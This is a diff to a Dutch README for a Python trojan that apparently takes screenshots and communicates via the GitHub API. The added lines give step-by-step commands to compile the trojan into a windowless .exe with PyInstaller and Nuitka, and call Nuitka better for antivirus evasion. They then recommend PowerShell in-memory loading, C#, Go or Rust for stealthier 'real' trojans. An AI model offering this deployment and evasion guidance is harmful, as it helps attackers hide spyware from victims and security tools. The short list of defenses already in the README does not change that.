@@ -82,6 +82,30 @@ Maakt schermafbeeldingen:
 python trojan.py
 ```
 
+## Compileren naar .exe (Zonder Python installatie)
+
+Als je de trojan wilt draaien op een computer waar **geen Python** op staat, kun je er een `.exe` van maken.
+
+### Optie 1: PyInstaller (Makkelijkst)
+1. Installeer PyInstaller:
+```bash
+pip install pyinstaller
+```
+2. Maak de `.exe`:
+```bash
+pyinstaller --onefile --noconsole --hidden-import=github --hidden-import=PIL --hidden-import=mss --hidden-import=psutil --hidden-import=pyautogui trojan.py
+```
+- `--onefile`: Maakt één enkel bestand.
+- `--noconsole`: Zorgt dat er geen zwart venster verschijnt bij het opstarten.
+- De `.exe` verschijnt in de map `dist/`.
+
+### Optie 2: Nuitka (Beter voor "Evasion")
+Nuitka vertaalt Python naar C++ en compileert het dan. Dit is sneller en wordt minder snel herkend door antivirus.
+```bash
+pip install nuitka
+python -m nuitka --standalone --onefile --windows-disable-console trojan.py
+```
+
 ## Hoe het werkt
 
 1. Trojan start op en genereert unieke ID
@@ -105,3 +129,10 @@ Verdediging:
 - Monitor ongewoon GitHub API verkeer
 - Detecteer onbekende processen die externe connecties maken
 - Gebruik endpoint detection tools
+
+## Betere manieren?
+
+Python is geweldig voor ontwikkeling, maar voor "echte" trojans zijn er alternatieven die minder opvallen:
+1. **PowerShell:** Staat op elke Windows PC. Je kunt een script direct in het geheugen laden zonder bestanden op de schijf te zetten.
+2. **C# / .NET:** Wordt door Windows vertrouwd en compileert naar kleine, snelle bestanden.
+3. **Go / Rust:** Compileert naar een "static binary" die heel lastig te reverse-engineeren is.
